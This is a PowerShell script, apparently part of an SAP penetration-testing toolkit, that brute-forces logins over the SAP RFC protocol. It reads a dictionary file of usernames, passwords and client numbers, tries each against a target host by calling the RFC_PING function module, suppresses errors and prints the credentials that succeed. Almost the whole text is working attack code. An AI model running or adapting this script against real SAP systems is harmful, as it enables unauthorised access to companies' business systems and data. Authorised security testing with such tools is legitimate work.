  <#
    .Synopsis
      Brute force attack over SAP RFC protocol  
    .Description
      Calls RFC_PING Function Module with a list of credentials stored in 
      dic_rfc.csv
    .Author
      @_Sn0rkY
  #>

 $ErrorActionPreference = "SilentlyContinue"


   #-Function Load-NCo: Loads NCo libraries
     Function Load-NCo {

      $ScriptDir = $PsScriptRoot
      
      $Size = [System.IntPtr]::Size
        If ($Size -eq 4) {
        $Path = $ScriptDir + "\..\..\NCo_x86\"
      }
      ElseIf ($Size -eq 8) {
        $Path = $ScriptDir + "\..\..\NCo_x86_64\"
      }

      [Reflection.Assembly]::LoadFile($Path + "sapnco.dll") > $Null
      [Reflection.Assembly]::LoadFile($Path + "sapnco_utils.dll") > $Null

    }

      #-Function Get-Destination: Target and credential
    Function Get-Destination {
    
    #-Connection parameters
        $cfgParams = New-Object SAP.Middleware.Connector.RfcConfigParameters
        $cfgParams.Add("NAME", "TEST")
        $cfgParams.Add("ASHOST", $target)
        $cfgParams.Add("SYSNR", $sysnr)
        $cfgParams.Add("CLIENT", $client)
        $cfgParams.Add("USER", $username)
        $cfgParams.Add("PASSWD", $password)

      Return [SAP.Middleware.Connector.RfcDestinationManager]::GetDestination($cfgParams)
     
     }
    
  #-Get-Ping:
    Function Get-Ping () {
      Load-NCo
      $destination = Get-Destination

      #-Metadata--------------------------------------------------------
        [SAP.Middleware.Connector.IRfcFunction]$rfcFunction =
          $destination.Repository.CreateFunction("RFC_PING")

      #-Variant 1: Call function module---------------------------------
        $ErrorActionPreference="Ignore"
        Try {
          $rfcFunction.Invoke($destination)
          Write-Host "`r`n==== SUCCESS ===`r`n"
          Write-Host "RFC_PING successful"
          Write-Host $username $password $client
        }
        Catch {
          Write-Host "try again"
        }
             
    }

 #-BruteForce
 Function BF () {
 Param(
 [parameter(Mandatory = $true)]
 [alias("t")]
 [string]$targetinput
 )
 $cvsimport = import-csv .\..\dic_rfc.csv
 ForEach($item in $cvsimport)
 {
 $target   = $targetinput
 $username = $item.Username
 $password = $item.Password
 $client   = $item.Client

 #Write-Host $username $password $client
 Get-Ping 
} 
}

 #-Main
 BF
 #-End
